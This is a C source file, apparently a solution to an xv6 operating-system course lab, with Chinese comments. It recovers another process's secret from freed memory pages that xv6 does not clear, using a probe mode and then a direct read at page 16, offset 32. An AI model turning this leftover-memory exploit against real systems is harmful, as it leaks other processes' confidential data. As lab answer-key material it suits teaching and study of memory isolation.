#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

// 已知的secret字符串，用于探测攻击
// 在实际攻击中，我们通过分析attacktest的行为模式来推断出这个值
char *mysecret="abcdefgh";

// 模式控制宏：
// PROBE_MODE= 0: 实际攻击模式，直接从预测的内存位置读取secret
// PROBE_MODE= 1: 探测模式，用于分析attacktest的内存分配模式

// （1）先令PROBE_MODE=1，运行attacktest，attack输出探测结果
// （2）随后，根据探测结果修改PROBE_RES宏，运行attacktest
// （3）attacktest输出测试结果

#define PROBE_MODE 1
#define PROBE_RES 16

int
main(int argc, char *argv[])
{
  // 攻击原理：
  // xv6的内存分配器在释放页面后不会清零或填充垃圾数据
  // attacktest程序会执行secret程序，secret程序会将密钥存储在内存中
  // secret程序结束后，其占用的内存页面会被释放，但内容仍然保留
  // 当我们的attack程序申请内存时，很可能获得之前secret程序使用过的页面
  // 通过读取这些页面的内容，就能恢复出原始的secret
  //
  // 具体策略：
  // - 通过PROBE_MODE模式分析attacktest的内存分配模式
  // - 确定secret通常存储在第几个页面的什么位置
  // - 在实际攻击中直接从该位置读取数据

  // your code here.  you should write the secret to fd 2 using write
  // (e.g., write(2, secret, 8)

  #if PROBE_MODE==0
  // ===================实际攻击模式===================
  // 基于探测得出的结论：secret通常存储在第16个页面偏移32字节的位置
  
  // 申请32个页面的内存空间
  // 这样做的目的是尽可能获得之前secret程序使用过的内存页面
  char *end = sbrk(PGSIZE*32);
  
  // 直接从预测的位置读取secret：第16个页面 + 32字节偏移
  // 偏移32字节的原因：kalloc会在释放的页面开头存储指向下一个空闲页面的指针
  // 如果直接从页面开头（偏移0）读取，会读到内存分配器的元数据而不是原始的secret数据
  // 偏移32字节可以跳过这些元数据，读取到secret程序留下的实际数据
  // (end+16*PGSIZE)+32 指向第16个页面的第32个字节
  // 将8字节的secret写入文件描述符2（stderr）
  write(2,(end+PROBE_RES*PGSIZE)+32,8);
  exit(0);

  #else
  // ===================探测模式===================
  // 这个模式用于分析和理解attacktest的内存分配模式
  // 通过模拟attacktest的行为，找出secret通常存储在哪个页面
  
  if(argc == 2){ 
    // 子进程：探测secret在内存中的位置
    // 申请32个页面，然后逐页搜索已知的mysecret
    char *end = sbrk(PGSIZE*32);
    for(int i = 0; i < 32; i++){
      // 在每个页面的偏移32字节处检查是否匹配mysecret
      // 偏移32字节的关键原因：xv6的kalloc在释放页面时，会在页面开头写入
      // 指向下一个空闲页面的指针，这会覆盖页面开头的原始数据
      // 因此必须跳过页面开头的元数据区域，从偏移32字节处开始读取
      if(strcmp(end+32, mysecret) == 0){
        printf("attack: found secret in %dth page\n", i); // 输出：found secret in 16th page\n
        exit(0);
      }
      end += PGSIZE; // 移动到下一个页面
    }
  }

  // 父进程：模拟attacktest的完整流程
  // 这样做是为了确保我们的内存分配模式与真实的attacktest保持一致

  // 父进程：模拟attacktest的完整流程
  // 这样做是为了确保我们的内存分配模式与真实的attacktest保持一致

  int pid;
  int fds[2];

  // 第一阶段：运行secret程序（模拟attacktest的第一个fork+exec）
  if((pid = fork()) < 0) {
    printf("fork failed\n");
    exit(1);   
  }

  if(pid == 0) {
    // 子进程：执行secret程序，使用已知的mysecret作为参数
    // 这一步会在内存中留下secret的痕迹
    char *newargv[] = { "secret", mysecret, 0 };
    exec(newargv[0], newargv);
    printf("exec %s failed\n", newargv[0]);
    exit(1);
  } else {
    // 父进程：等待secret程序执行完毕
    // secret程序结束后，其内存页面被释放但内容保留
    wait(0);  // wait for secret to exit
    
    // 第二阶段：创建管道并运行attack程序（模拟attacktest的第二个fork+exec）
    if(pipe(fds) < 0) {
      printf("pipe failed\n");
      exit(1);   
    }
    if((pid = fork()) < 0) {
      printf("fork failed\n");
      exit(1);   
    }
    if(pid == 0) {
      // 子进程：设置输出重定向，然后执行attack程序进行探测
      close(fds[0]);
      close(2);
      dup(fds[1]);
      // 传递一个参数，让attack程序知道这是探测模式
      char *newargv[] = { "attack", "aaaa", 0 };
      exec(newargv[0], newargv);
      printf("exec %s failed\n", newargv[0]); 
      exit(1);
    }
    // 父进程：等待探测完成
    wait(0);
  }

  #endif

  // 攻击总结：
  // （1）在PROBE_MODE=1时，我们模拟attacktest的完整执行流程来分析内存布局
  // （2）通过实验发现secret通常存储在第16个页面的偏移32字节处
  // （3）在PROBE_MODE=0时，我们直接利用这个发现进行攻击
  // （4）由于xv6不清零释放的内存，我们能够成功恢复secret内容
  
  // 这种攻击利用了以下漏洞：
  // - 内存管理器不清零释放的页面
  // - 进程间的内存隔离不够完善  
  // - secret程序没有主动清零敏感数据

  // 另外，对于为什么不在页面的开头写入秘密字符串：
  // - kalloc会在空闲页面开头存储链表指针，但不会清零整个页面
  // - 通过适当的偏移可以绕过分配器的元数据，读取到残留的用户数据

}
